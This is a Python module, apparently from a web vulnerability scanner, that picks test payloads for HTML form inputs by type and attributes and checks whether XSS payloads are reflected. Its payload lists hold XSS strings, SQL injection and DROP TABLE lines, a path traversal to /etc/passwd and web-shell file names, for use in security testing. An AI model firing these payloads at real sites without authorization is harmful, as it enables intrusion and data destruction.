from typing import Dict, List, Any, Union
import re
from utils.xss_payloads import XSS_PAYLOADS

"""
Input Analyzer - Geniş kapsamlı ve detaylı

- HTML5 input türleri için zengin payload setleri
- Attribute'lara göre (maxlength, minlength, pattern, min, max, required)
  payload listelerini filtreleme ve genişletme
"""

_TYPE_PAYLOADS: Dict[str, List[str]] = {
    "text": [
        "<script>alert(1)</script>",
        "' OR '1'='1",
        "admin",
        "normalinput",
        "'; DROP TABLE users; --",
        "<svg/onload=alert(1)>",
    ],
    "search": [
        "test",
        "../../../../etc/passwd",
        "' OR '1'='1",
        "<img src=x onerror=alert(1)>",
    ],
    "email": [
        "injection@test.com",
        "\"onmouseover=alert(1)\"@x.com",
        "normal@example.com",
        "a'*%3Cscript%3Ealert(1)%3C/script%3E@b.com",
    ],
    "password": [
        "Password123!",
        "' OR ''='",
        "<script>alert('pass')</script>",
        "12345678",
    ],
    "number": [
        "0", "-1", "9999999999", "1 OR 1=1", "2147483647", "-2147483648",
        "3.14159", "1e10", "NaN", "Infinity"
    ],
    "range": [
        "0", "100", "-999", "2147483647", "-2147483648",
    ],
    "tel": [
        "+905000000000", "+1234567890", "<svg/onload=alert(1)>", "123abc456",
    ],
    "url": [
        "http://evil.com", "javascript:alert(1)", "https://normal.com", "//evil.com",
    ],
    "checkbox": ["on", "off", "true", "false", "", "1", "0"],
    "radio": ["1", "0", "true", "false"],
    "hidden": ["admin", "' OR 1=1--", "hiddenValue"],
    "file": ["shell.php", "evil.jpg.php", "test.txt", "normal.pdf"],
    "date": ["2025-01-01", "9999-12-31", "' OR 1=1--", "0000-00-00"],
    "datetime-local": [
        "2025-06-24T12:34", "2025-12-31T23:59", "1970-01-01T00:00",
    ],
    "color": ["#000000", "#ffffff", "#ff00ff"],
    "month": ["2025-01", "2025-12"],
    "week": ["2025-W01", "2025-W52"],
    "time": ["12:00", "23:59", "00:00"],
    "submit": ["Submit"],
    "reset": ["Reset"],
    "button": ["Click"],
    "image": ["/path/to/image.jpg"],
}

_FALLBACKS = {
    "numeric": ["0", "-1", "9999", "3.14159"],
    "boolean": ["true", "false", "1", "0", ""],
    "string": ["test", "<svg/onload=alert(1)>"],
    "date": ["2025-01-01"]
}

def _category(t: str) -> str:
    t = t.lower()
    if t in ("number", "range"):
        return "numeric"
    if t in ("checkbox", "radio"):
        return "boolean"
    if t in ("date", "time", "month", "week", "datetime-local"):
        return "date"
    return "string"

def _apply_length_constraints(payloads: List[str], attrs: Dict[str, Any]) -> List[str]:
    maxlength = int(attrs.get("maxlength", 0)) or None
    minlength = int(attrs.get("minlength", 0)) or None
    filtered = []
    for p in payloads:
        if maxlength and len(p) > maxlength:
            continue
        if minlength and len(p) < minlength:
            continue
        filtered.append(p)
    return filtered or payloads

def _apply_pattern_constraint(payloads: List[str], pattern: str) -> List[str]:
    try:
        regex = re.compile(pattern)
        filtered = [p for p in payloads if regex.fullmatch(p)]
        return filtered if filtered else payloads
    except re.error:
        return payloads

def _generate_min_max_variants(attrs: Dict[str, Any]) -> List[str]:
    variants = []
    try:
        if "min" in attrs:
            min_val = float(attrs["min"])
            variants.append(str(min_val - 1))
            variants.append(str(min_val))
        if "max" in attrs:
            max_val = float(attrs["max"])
            variants.append(str(max_val))
            variants.append(str(max_val + 1))
    except ValueError:
        pass
    return variants

def _apply_required_field(payloads: List[str], attrs: Dict[str, Any]) -> List[str]:
    if "required" in attrs:
        return [""] + payloads
    return payloads

def _enforce_numeric_format(payloads: List[str], attrs: Dict[str, Any]) -> List[str]:
    if attrs.get("step") == "1":
        return [p for p in payloads if re.fullmatch(r"-?\d+", p)] or payloads
    return payloads

def is_reflected_xss(response_text: str, payload: str) -> bool:
    """
    Yanıtta XSS payload'ı yansıyor mu ve hangi bağlamda?
    Context-aware bir analiz yapar.
    """
    if payload not in response_text:
        return False

    context_patterns = [
        r"<script[^>]*?>[^<]*?" + re.escape(payload) + r"[^<]*?</script>",
        r"<[^>]+?on\w+\s*=\s*['\"]?" + re.escape(payload),
        r"<iframe[^>]+?src\s*=\s*['\"]?" + re.escape(payload),
        r"<style[^>]*?>[^<]*?" + re.escape(payload),
        r"<[^>]+?href\s*=\s*['\"]?" + re.escape(payload),
        r"<[^>]+?>[^<]*?" + re.escape(payload) + r"[^<]*?</[^>]+?>"
    ]

    for pattern in context_patterns:
        if re.search(pattern, response_text, re.IGNORECASE):
            return True

    return False

def analyze_input(
    input_type: str,
    input_name: str = "",
    attrs: Union[Dict[str, Any], None] = None
) -> Dict[str, Any]:
    t = (input_type or "text").lower()
    attrs = attrs or {}

    payloads = _TYPE_PAYLOADS.get(t, [])
    if not payloads:
        payloads = _FALLBACKS[_category(t)]

    payloads = _apply_required_field(payloads, attrs)
    payloads = _apply_length_constraints(payloads, attrs)

    if "pattern" in attrs:
        payloads = _apply_pattern_constraint(payloads, attrs["pattern"])

    if t in ("number", "range", "tel"):
        variants = _generate_min_max_variants(attrs)
        payloads = list(set(payloads + variants))
        payloads = _enforce_numeric_format(payloads, attrs)

    if t in ("checkbox", "radio"):
        logicals = ["on", "off", "true", "false", "1", "0"]
        payloads = list(set(payloads + logicals))

    return {
        "input_name": input_name,
        "input_type": t,
        "attrs": attrs,
        "payloads": payloads,
    }

# Demo test
if __name__ == "__main__":
    demo_attrs = {
        "required": "",
        "maxlength": "10",
        "minlength": "3",
        "pattern": "[a-zA-Z]+",
        "min": "1",
        "max": "100",
        "step": "1"
    }
    print(analyze_input("text", "username", demo_attrs))
    print(analyze_input("number", "age", demo_attrs))
    print(analyze_input("checkbox", "subscribe", {"required": ""}))
